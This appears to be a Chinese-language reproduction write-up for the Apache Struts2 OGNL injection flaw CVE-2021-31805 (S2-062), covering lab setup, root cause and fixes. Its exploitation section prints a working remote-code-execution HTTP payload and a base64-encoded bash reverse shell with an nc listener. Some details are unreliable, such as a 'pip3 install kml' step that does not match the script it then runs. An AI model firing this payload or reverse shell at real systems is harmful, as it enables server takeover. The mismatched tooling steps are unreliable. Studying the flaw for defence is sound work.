
## 目录
1. [Struts2 框架介绍](#struts2-框架介绍)
2. [漏洞概况](#漏洞概况)
3. [漏洞复现](#漏洞复现)
4. [漏洞原理分析](#漏洞原理分析)
5. [修复方案](#修复方案)
6. [法律声明](#法律声明)

---

## Struts2 框架介绍

### MVC 架构与 Struts2
- **MVC（Model-View-Controller）**：  
  - **作用**：分离页面展示代码与业务逻辑代码，提升可维护性和开发效率。  
  - **Struts2 实现**：  
    - **请求流程**：浏览器 → Struts2（控制器） → Action（业务逻辑） → JSP（视图） → 响应。  
    - **核心组件**：  
      - **路由（Route）**：定义请求转发规则。  
      - **拦截器（Interceptor）**：处理请求前后的逻辑（如权限校验）。  
      - **标签库**：支持 OGNL 表达式，简化视图层开发。  

### Struts2 历史
- 2001 年发布，2007 年发布 2.0 版本。  
- 与 Spring、Hibernate 组成经典的 **SSH（Struts2 + Spring + Hibernate）** 架构。  

---

## 漏洞概况

### 基本信息
- **CVE 编号**：CVE-2021-31805  
- **漏洞类型**：远程代码执行（RCE）  
- **漏洞根源**：恶意 OGNL 表达式注入  
- **影响版本**：`2.0.0 <= Apache Struts <= 2.5.29`  
- **关联漏洞**：CVE-2020-17530（S2-061）  

### 漏洞背景
- **时间线**：2022 年 4 月 13 日公开细节，攻击者可通过构造恶意请求绕过安全限制，执行任意代码。  
- **官方文档**：  
  - [CVE-2021-31805 详情](http://cve.mitre.org/cgi-bin/cekey.cgi?keyword=CVE-2021-31805)  
  - [Apache Struts 安全公告](https://cwiki.apache.org/confluence/display/WW/S2-062)  

---

## 漏洞复现

### 环境搭建
#### 方式 1：Docker 靶场（推荐）
```yaml
# docker-compose.yml
version: '2'
services:
  struts2:
    image: vulhub/struts2:2.5.25
    ports:
      - "18080:8080"
```
启动命令：  
```bash
docker-compose up
```

#### 方式 2：本地源码调试
- 下载 Struts2 2.5.25 版本源码，配置调试环境。  

### 漏洞利用步骤
#### 1. 验证漏洞存在
```http
GET /index.action?id=%25{6*6} HTTP/1.1
Host: 192.168.142.128:18080
```
响应中若包含 `36`，说明 OGNL 表达式已执行。

#### 2. 执行任意命令（示例：`whoami`）
```http
POST /index.action HTTP/1.1
Host: 192.168.142.128:18080
Content-Type: multipart/form-data; boundary=WebKitFormBoundary

--WebKitFormBoundary
Content-Disposition: form-data; name="id"

%{
  #request.map=#@org.apache.commons.collections.BeanMap@{},
  #request.map.setBean(request.get('struts.valueStack')),
  #application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec('whoami')
}
--WebKitFormBoundary--
```

#### 3. 反弹 Shell（需提前监听）
```bash
# 攻击机监听
nc -lvvp 7777

# Payload 中替换以下命令（Base64 编码）
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzc3NzcgMD4mMQ==}|{base64,-d}|{bash,-i}
```

---

## 漏洞原理分析

### OGNL 表达式注入
- **OGNL（Object-Graph Navigation Language）**：  
  - Struts2 默认支持的表达式语言，用于动态访问对象属性和方法。  
  - 攻击者通过 `%{...}` 注入恶意表达式，触发二次解析。  

### 关键绕过技术
1. **BeanMap 绕过黑名单**：  
   - 使用 `BeanMap` 修改 `memberAccess` 对象的 `excludedPackageNames` 和 `excludedClasses`，解除安全限制。  
2. **InstanceManager 实例化危险类**：  
   - 通过 `freemarker.template.utility.Execute` 类执行系统命令。  

### 调试入口
- **触发点**：`ComponentTagSupport#doStartTag()` 方法中的 `populateParams()` 和二次解析逻辑。  
- **代码片段**：  
  ```java
  ValueStack stack = this.getStack();
  this.component = this.getBean(stack, (HttpServletRequest)this.pageContext.getRequest());
  this.populateParams();  // 第一次解析参数
  boolean evalBody = this.component.start(this.pageContext.getOut());  // 第二次解析触发漏洞
  ```

---

## 修复方案

### 官方修复
1. **升级版本**：  
   - Apache Struts >= 2.5.30 或 2.3.37（官方已修复版本）。  
2. **禁用危险配置**：  
   ```xml
   <!-- struts.xml -->
   <constant name="struts.ognl.allowStaticMethodAccess" value="false"/>
   ```

### 临时缓解
- **输入过滤**：对用户输入的 `%{` 和 `}` 进行转义或拦截。  
- **禁用动态方法调用**：  
  ```xml
  <constant name="struts.enable.DynamicMethodInvocation" value="false"/>
  ```

### 检测工具
- **手动检测**：发送包含 `%{6*6}` 的请求，检查返回结果是否包含 `36`。  
- **自动化工具**：  
  ```bash
  pip3 install kml
  s2-062.py --url http://target.com --cmd whoami
  ```

---

## 法律声明
> **《中华人民共和国网络安全法》第二十七条**  
> 任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。  
> **本内容仅用于防御性技术研究，严禁用于非法用途！**
```